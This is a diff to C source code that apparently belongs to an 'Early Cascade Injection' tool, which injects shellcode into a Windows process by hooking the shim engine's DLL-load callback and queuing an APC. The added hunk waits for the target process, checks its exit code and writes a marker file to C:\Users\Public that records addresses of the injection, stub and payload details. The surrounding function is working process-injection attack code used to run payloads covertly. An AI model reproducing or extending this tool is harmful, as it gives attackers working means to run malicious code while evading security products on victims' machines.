@@ -293,6 +293,62 @@ BOOL EarlyCascadeInject(const char* targetProcess, PVOID payload, DWORD payloadS
     printf("[+] Stub will disable shim engine and queue APC with payload\n");
     printf("===================================================================\n");
 
+    // 等待并验证注入效果
+    printf("\n[*] Waiting 5 seconds to verify injection...\n");
+    Sleep(5000);
+
+    DWORD exitCode = 0;
+    if (GetExitCodeProcess(pi.hProcess, &exitCode)) {
+        if (exitCode != STILL_ACTIVE) {
+            printf("[+] Target process exited (Exit code: %u) - Payload executed!\n", exitCode);
+
+            // 创建验证文件
+            HANDLE hMarker = CreateFileA(
+                "C:\\Users\\Public\\early_cascade_verified.txt",
+                GENERIC_WRITE,
+                0,
+                NULL,
+                CREATE_ALWAYS,
+                FILE_ATTRIBUTE_NORMAL,
+                NULL
+            );
+
+            if (hMarker != INVALID_HANDLE_VALUE) {
+                char msg[1024];
+                snprintf(msg, sizeof(msg),
+                    "Early Cascade Injection Verified!\n"
+                    "Target Process: %s\n"
+                    "Process PID: %u\n"
+                    "Remote Memory: 0x%p\n"
+                    "g_ShimsEnabled: 0x%p\n"
+                    "g_pfnSE_DllLoaded: 0x%p\n"
+                    "Encoded Stub Pointer: 0x%p\n"
+                    "Stub Size: %zu bytes\n"
+                    "Payload Size: %u bytes\n"
+                    "Exit Code: %u\n"
+                    "Status: Process exited - shellcode executed!\n"
+                    "Technique: Hook DLL load callback via Shim Engine\n"
+                    "Execution Timing: First DLL load triggers stub -> APC queues payload\n",
+                    targetProcess,
+                    pi.dwProcessId,
+                    remoteMemory,
+                    g_ShimsEnabled,
+                    g_pfnSE_DllLoaded,
+                    encodedStub,
+                    sizeof(stub),
+                    payloadSize,
+                    exitCode
+                );
+                DWORD written;
+                WriteFile(hMarker, msg, strlen(msg), &written, NULL);
+                CloseHandle(hMarker);
+                printf("[+] Verification file created: C:\\Users\\Public\\early_cascade_verified.txt\n");
+            }
+        } else {
+            printf("[!] Target process still running (PID: %u)\n", pi.dwProcessId);
+        }
+    }
+
     success = TRUE;
 
 CLEANUP:
